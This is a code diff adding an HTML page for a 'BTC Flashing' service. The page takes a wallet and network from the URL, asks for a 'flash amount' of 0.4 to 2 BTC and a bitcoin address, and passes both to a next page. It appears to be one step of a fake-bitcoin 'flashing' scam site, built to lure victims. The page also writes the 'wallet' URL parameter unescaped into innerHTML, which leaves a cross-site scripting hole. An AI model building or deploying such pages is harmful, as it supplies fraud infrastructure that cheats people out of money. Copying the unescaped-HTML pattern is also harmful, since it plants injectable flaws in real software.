@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>BTC Flashing - Enter Details</title>
+  <style>
+    body {
+      background: #0d0d0d;
+      color: #f7931a;
+      font-family: monospace;
+      text-align: center;
+      padding: 20px;
+    }
+    .box {
+      background: #1a1a1a;
+      border: 1px solid #f7931a;
+      border-radius: 10px;
+      padding: 30px;
+      box-shadow: 0 0 15px #f7931a;
+      max-width: 400px;
+      margin: 50px auto;
+    }
+    input {
+      width: 90%;
+      padding: 10px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 5px;
+      background: #262626;
+      color: #f7931a;
+      font-size: 16px;
+    }
+    button {
+      padding: 10px 25px;
+      font-size: 16px;
+      margin-top: 20px;
+      background: #f7931a;
+      color: #000;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-weight: bold;
+      box-shadow: 0 0 10px #f7931a;
+    }
+    .popup {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #111;
+      color: red;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px red;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>BTC Flashing Details</h1>
+  <div class="box">
+    <div id="walletInfo"></div>
+    <input type="number" id="amount" placeholder="Enter Flash Amount (BTC)" step="0.00001"/>
+    <input type="text" id="btcAddress" placeholder="Enter Your BTC Address"/>
+    <button onclick="next()">Continue</button>
+  </div>
+
+  <div class="popup" id="popup"></div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const network = params.get("network");
+    const wallet = params.get("wallet");
+    document.getElementById("walletInfo").innerHTML = `<b>Wallet:</b> ${wallet}<br><b>Network:</b> ${network}`;
+
+    function showPopup(msg) {
+      const popup = document.getElementById("popup");
+      popup.innerText = msg;
+      popup.style.display = "block";
+      setTimeout(() => popup.style.display = "none", 3000);
+    }
+
+    function next() {
+      const amount = parseFloat(document.getElementById("amount").value);
+      const address = document.getElementById("btcAddress").value.trim();
+
+      if (isNaN(amount) || amount < 0.4 || amount > 2) {
+        showPopup("Amount must be between 0.4 and 2 BTC");
+        return;
+      }
+
+      if (!address || address.length < 20) {
+        showPopup("Please enter a valid BTC address");
+        return;
+      }
+
+      const url = `btc3.html?amount=${amount}&address=${encodeURIComponent(address)}`;
+      window.location.href = url;
+    }
+  </script>
+
+</body>
+</html>
